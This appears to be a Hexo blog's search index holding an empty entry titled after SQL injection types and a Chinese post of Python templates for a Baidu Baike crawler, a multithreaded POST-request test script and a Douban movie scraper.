<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/04/21/SQL-Injection-Types/"/>
      <url>/2024/04/21/SQL-Injection-Types/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python Script Writing Template</title>
      <link href="/2020/08/11/Python-Script-Writing-Template/"/>
      <url>/2020/08/11/Python-Script-Writing-Template/</url>
      
        <content type="html"><![CDATA[<h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><h3 id="入口函数-爬虫调度段"><a href="#入口函数-爬虫调度段" class="headerlink" title="入口函数(爬虫调度段)"></a>入口函数(爬虫调度段)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> time, datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> maya_Spider <span class="keyword">import</span> url_manager, html_downloader, html_parser, html_outputer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Spider_Main</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> <span class="comment">#初始化操作</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">  <span class="comment">#设置url管理器</span></span><br><span class="line">  self.urls = url_manager.UrlManager()</span><br><span class="line">  <span class="comment">#设置HTML下载器</span></span><br><span class="line">  self.downloader = html_downloader.HtmlDownloader()</span><br><span class="line">  <span class="comment">#设置HTML解析器</span></span><br><span class="line">  self.parser = html_parser.HtmlParser()</span><br><span class="line">  <span class="comment">#设置HTML输出器</span></span><br><span class="line">  self.outputer = html_outputer.HtmlOutputer()</span><br><span class="line"></span><br><span class="line"> <span class="comment">#爬虫调度程序</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">craw</span>(<span class="params">self, root_url</span>):</span><br><span class="line">  count = <span class="number">1</span></span><br><span class="line">  self.urls.add_new_url(root_url)</span><br><span class="line">  <span class="keyword">while</span> self.urls.has_new_url():</span><br><span class="line">   <span class="keyword">try</span>:</span><br><span class="line">    new_url = self.urls.get_new_url()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;craw %d : %s&#x27;</span> % (count, new_url))</span><br><span class="line">    html_content = self.downloader.download(new_url)</span><br><span class="line">    new_urls, new_data = self.parser.parse(new_url, html_content)</span><br><span class="line">    self.urls.add_new_urls(new_urls)</span><br><span class="line">    self.outputer.collect_data(new_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">10</span>:</span><br><span class="line">     <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;craw failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  self.outputer.output_html()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> <span class="comment">#设置爬虫入口</span></span><br><span class="line"> root_url = <span class="string">&#x27;http://baike.baidu.com/view/21087.htm&#x27;</span></span><br><span class="line"> <span class="comment">#开始时间</span></span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;开始计时..............&#x27;</span>)</span><br><span class="line"> start_time = datetime.datetime.now()</span><br><span class="line"> obj_spider = Spider_Main()</span><br><span class="line"> obj_spider.craw(root_url)</span><br><span class="line"> <span class="comment">#结束时间</span></span><br><span class="line"> end_time = datetime.datetime.now()</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;总用时：%ds&#x27;</span>% (end_time - start_time).seconds)</span><br></pre></td></tr></table></figure><h3 id="URL管理器"><a href="#URL管理器" class="headerlink" title="URL管理器"></a>URL管理器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UrlManager</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">  self.new_urls = <span class="built_in">set</span>()</span><br><span class="line">  self.old_urls = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">add_new_url</span>(<span class="params">self, url</span>):</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.new_urls <span class="keyword">and</span> url <span class="keyword">not</span> <span class="keyword">in</span> self.old_urls:</span><br><span class="line">   self.new_urls.add(url)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">add_new_urls</span>(<span class="params">self, urls</span>):</span><br><span class="line">  <span class="keyword">if</span> urls <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(urls) == <span class="number">0</span>:</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">   self.add_new_url(url)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">has_new_url</span>(<span class="params">self</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">len</span>(self.new_urls) != <span class="number">0</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_new_url</span>(<span class="params">self</span>):</span><br><span class="line">  new_url = self.new_urls.pop()</span><br><span class="line">  self.old_urls.add(new_url)</span><br><span class="line">  <span class="keyword">return</span> new_url</span><br></pre></td></tr></table></figure><h3 id="网页下载器"><a href="#网页下载器" class="headerlink" title="网页下载器"></a>网页下载器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HtmlDownloader</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, url</span>):</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#伪装成浏览器访问，直接访问的话csdn会拒绝</span></span><br><span class="line">  user_agent = <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)&#x27;</span></span><br><span class="line">  headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>:user_agent&#125;</span><br><span class="line">  <span class="comment">#构造请求</span></span><br><span class="line">  req = urllib.request.Request(url,headers=headers)</span><br><span class="line">  <span class="comment">#访问页面</span></span><br><span class="line">  response = urllib.request.urlopen(req)</span><br><span class="line">  <span class="comment">#python3中urllib.read返回的是bytes对象，不是string,得把它转换成string对象，用bytes.decode方法</span></span><br><span class="line">  <span class="keyword">return</span> response.read().decode()</span><br></pre></td></tr></table></figure><h3 id="网页解析器"><a href="#网页解析器" class="headerlink" title="网页解析器"></a>网页解析器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HtmlParser</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">_get_new_urls</span>(<span class="params">self, page_url, soup</span>):</span><br><span class="line">  new_urls = <span class="built_in">set</span>()</span><br><span class="line">  <span class="comment">#/view/123.htm</span></span><br><span class="line">  links = soup.find_all(<span class="string">&#x27;a&#x27;</span>, href=re.<span class="built_in">compile</span>(<span class="string">r&#x27;/item/.*?&#x27;</span>))</span><br><span class="line">  <span class="keyword">for</span> link <span class="keyword">in</span> links:</span><br><span class="line">   new_url = link[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">   new_full_url = urllib.parse.urljoin(page_url, new_url)</span><br><span class="line">   new_urls.add(new_full_url)</span><br><span class="line">  <span class="keyword">return</span> new_urls</span><br><span class="line"></span><br><span class="line"> <span class="comment">#获取标题、摘要</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">_get_new_data</span>(<span class="params">self, page_url, soup</span>):</span><br><span class="line">  <span class="comment">#新建字典</span></span><br><span class="line">  res_data = &#123;&#125;</span><br><span class="line">  <span class="comment">#url</span></span><br><span class="line">  res_data[<span class="string">&#x27;url&#x27;</span>] = page_url</span><br><span class="line">  <span class="comment">#&lt;dd class=&quot;lemmaWgt-lemmaTitle-title&quot;&gt;&lt;h1&gt;Python&lt;/h1&gt;获得标题标签</span></span><br><span class="line">  title_node = soup.find(<span class="string">&#x27;dd&#x27;</span>, class_=<span class="string">&quot;lemmaWgt-lemmaTitle-title&quot;</span>).find(<span class="string">&#x27;h1&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">str</span>(title_node.get_text()))</span><br><span class="line">  res_data[<span class="string">&#x27;title&#x27;</span>] = <span class="built_in">str</span>(title_node.get_text())</span><br><span class="line">  <span class="comment">#&lt;div class=&quot;lemma-summary&quot; label-module=&quot;lemmaSummary&quot;&gt;</span></span><br><span class="line">  summary_node = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&quot;lemma-summary&quot;</span>)</span><br><span class="line">  res_data[<span class="string">&#x27;summary&#x27;</span>] = summary_node.get_text()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res_data</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, page_url, html_content</span>):</span><br><span class="line">  <span class="keyword">if</span> page_url <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> html_content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  soup = BeautifulSoup(html_content, <span class="string">&#x27;html.parser&#x27;</span>, from_encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  new_urls = self._get_new_urls(page_url, soup)</span><br><span class="line">  new_data = self._get_new_data(page_url, soup)</span><br><span class="line">  <span class="keyword">return</span> new_urls, new_data</span><br></pre></td></tr></table></figure><h3 id="网页输出器"><a href="#网页输出器" class="headerlink" title="网页输出器"></a>网页输出器</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">HtmlOutputer</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">  self.datas = []</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">collect_data</span>(<span class="params">self, data</span>):</span><br><span class="line">  <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line">  self.datas.append(data )</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">output_html</span>(<span class="params">self</span>):</span><br><span class="line">  fout = <span class="built_in">open</span>(<span class="string">&#x27;maya.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&quot;&lt;head&gt;&lt;meta http-equiv=&#x27;content-type&#x27; content=&#x27;text/html;charset=utf-8&#x27;&gt;&lt;/head&gt;&quot;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;html&gt;&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;body&gt;&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;table border=&quot;1&quot;&gt;&#x27;</span>)</span><br><span class="line">  <span class="comment"># &lt;th width=&quot;5%&quot;&gt;Url&lt;/th&gt;</span></span><br><span class="line">  fout.write(<span class="string">&#x27;&#x27;&#x27;&lt;tr style=&quot;color:red&quot; width=&quot;90%&quot;&gt;</span></span><br><span class="line"><span class="string">     &lt;th&gt;Theme&lt;/th&gt;</span></span><br><span class="line"><span class="string">     &lt;th width=&quot;80%&quot;&gt;Content&lt;/th&gt;</span></span><br><span class="line"><span class="string">     &lt;/tr&gt;&#x27;&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> data <span class="keyword">in</span> self.datas:</span><br><span class="line">   fout.write(<span class="string">&#x27;&lt;tr&gt;\n&#x27;</span>)</span><br><span class="line">   <span class="comment"># fout.write(&#x27;\t&lt;td&gt;%s&lt;/td&gt;&#x27; % data[&#x27;url&#x27;])</span></span><br><span class="line">   fout.write(<span class="string">&#x27;\t&lt;td align=&quot;center&quot;&gt;&lt;a href=\&#x27;%s\&#x27;&gt;%s&lt;/td&gt;&#x27;</span> % (data[<span class="string">&#x27;url&#x27;</span>], data[<span class="string">&#x27;title&#x27;</span>]))</span><br><span class="line">   fout.write(<span class="string">&#x27;\t&lt;td&gt;%s&lt;/td&gt;\n&#x27;</span> % data[<span class="string">&#x27;summary&#x27;</span>])</span><br><span class="line">   fout.write(<span class="string">&#x27;&lt;/tr&gt;\n&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;/table&gt;&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;/body&gt;&#x27;</span>)</span><br><span class="line">  fout.write(<span class="string">&#x27;&lt;/html&gt;&#x27;</span>)</span><br><span class="line">  fout.close()</span><br></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p><strong>实现可设置持续运行时间、线程数及时间间隔的多线程异步post请求功能</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">random.randint(a, b):用于生成一个指定范围内的整数。</span></span><br><span class="line"><span class="string">其中参数a是下限，参数b是上限，生成的随机数n: a &lt;= n &lt;= b</span></span><br><span class="line"><span class="string">random.choice(sequence)：从序列中获取一个随机元素</span></span><br><span class="line"><span class="string">参数sequence表示一个有序类型（列表，元组，字符串）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> httplib,json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint,choice</span><br><span class="line"><span class="comment">#创建请求函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">postRequest</span>(<span class="params">threadNum</span>):</span><br><span class="line">  postJson=&#123;</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">#定义需要进行发送的数据</span></span><br><span class="line">  postData=json.dumps(postJson)</span><br><span class="line">  <span class="comment">#定义一些文件头</span></span><br><span class="line">  headerdata = &#123;</span><br><span class="line">    <span class="string">&quot;content-type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">     &#125;</span><br><span class="line">  <span class="comment">#接口</span></span><br><span class="line">  requrl =<span class="string">&quot;/v1/query&quot;</span></span><br><span class="line">  <span class="comment">#请求服务,例如：www.baidu.com</span></span><br><span class="line">  hostServer=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="comment">#连接服务器</span></span><br><span class="line">  conn = httplib.HTTPConnection(hostServer)</span><br><span class="line">  <span class="comment">#发送请求</span></span><br><span class="line">  conn.request(method=<span class="string">&quot;POST&quot;</span>,url=requrl,body=postData,headers=headerdata)</span><br><span class="line">  <span class="comment">#获取请求响应</span></span><br><span class="line">  response=conn.getresponse()</span><br><span class="line">  <span class="comment">#打印请求状态</span></span><br><span class="line">  <span class="keyword">if</span> response.status <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>,<span class="number">300</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&quot;线程&quot;</span>+<span class="built_in">str</span>(threadNum)+<span class="string">u&quot;状态码：&quot;</span>+<span class="built_in">str</span>(response.status)</span><br><span class="line">  conn.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">threadNum,internTime,duration</span>):</span><br><span class="line">  <span class="comment">#创建数组存放线程</span></span><br><span class="line">  threads=[]</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#创建线程</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,threadNum):</span><br><span class="line">      <span class="comment">#针对函数创建线程</span></span><br><span class="line">      t=threading.Thread(target=postRequest,args=(i,))</span><br><span class="line">      <span class="comment">#把创建的线程加入线程组</span></span><br><span class="line">      threads.append(t)</span><br><span class="line">  <span class="keyword">except</span> Exception,e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    <span class="comment">#启动线程</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        thread.start()</span><br><span class="line">        time.sleep(internTime)</span><br><span class="line">    <span class="comment">#等待所有线程结束</span></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join(duration)</span><br><span class="line">  <span class="keyword">except</span> Exception,e:</span><br><span class="line">      <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  startime=time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)</span><br><span class="line">  now=time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)</span><br><span class="line">  duratiion=raw_input(<span class="string">u&quot;输入持续运行时间:&quot;</span>)</span><br><span class="line">  <span class="keyword">while</span> (startime+<span class="built_in">str</span>(duratiion))!=now:</span><br><span class="line">    run(<span class="number">10</span>,<span class="number">1</span>,<span class="built_in">int</span>(duratiion))</span><br><span class="line">    now=time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="爬虫数据处理Json"><a href="#爬虫数据处理Json" class="headerlink" title="爬虫数据处理Json"></a>爬虫数据处理Json</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:&#x27;utf-8&#x27;</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#找到网址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getDatas</span>():</span><br><span class="line">  <span class="comment"># 伪装</span></span><br><span class="line">  header=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&quot;Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11&quot;</span>&#125;</span><br><span class="line">  <span class="comment"># url=&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line">  url=<span class="string">&quot;file:///E:/scrapy/2018-04-27/movie/movie.html&quot;</span></span><br><span class="line">  ret=urllib.request.Request(url=url,headers=header)</span><br><span class="line">  <span class="comment"># 打开网页</span></span><br><span class="line">  res=urllib.request.urlopen(ret)</span><br><span class="line">  <span class="comment"># 转化格式</span></span><br><span class="line">  response=BeautifulSoup(res,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">  <span class="comment"># 找到想要数据的父元素</span></span><br><span class="line">  datas=response.find_all(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;item&#x27;</span>&#125;)</span><br><span class="line">  <span class="comment"># print(datas)</span></span><br><span class="line">  <span class="comment">#创建存放数据的文件夹</span></span><br><span class="line">  folder_name=<span class="string">&quot;output&quot;</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder_name):</span><br><span class="line">      os.mkdir(folder_name)</span><br><span class="line">  <span class="comment"># 定义文件</span></span><br><span class="line">  current_time=time.strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>,time.localtime())</span><br><span class="line">  file_name=<span class="string">&quot;move&quot;</span>+current_time+<span class="string">&quot;.json&quot;</span></span><br><span class="line">  <span class="comment"># 文件路径</span></span><br><span class="line">  file_path=folder_name+<span class="string">&quot;/&quot;</span>+file_name</span><br><span class="line">  <span class="keyword">for</span> item <span class="keyword">in</span> datas:</span><br><span class="line">    <span class="comment"># print(item)</span></span><br><span class="line">    dict1=&#123;&#125;</span><br><span class="line">    dict1[<span class="string">&#x27;rank&#x27;</span>]=item.find(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;pic&#x27;</span>&#125;).find(<span class="string">&#x27;em&#x27;</span>).get_text()</span><br><span class="line">    dict1[<span class="string">&#x27;title&#x27;</span>]=item.find(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;info&#x27;</span>&#125;).find(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;hd&#x27;</span>&#125;).find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;span&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;title&#x27;</span>&#125;).get_text()</span><br><span class="line">    dict1[<span class="string">&#x27;picUrl&#x27;</span>]=item.find(<span class="string">&#x27;div&#x27;</span>,&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;pic&#x27;</span>&#125;).find(<span class="string">&#x27;a&#x27;</span>).find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(picUrl)</span></span><br><span class="line">    <span class="comment"># 保存数据为json格式</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      <span class="keyword">with</span> codecs.<span class="built_in">open</span>(file_path,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(json.dumps(dict1,ensure_ascii=<span class="literal">False</span>)+<span class="string">&quot;,\n&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> err:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>+<span class="built_in">str</span>(err))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">      fp.close()</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line">getDatas()</span><br><span class="line"><span class="comment"># 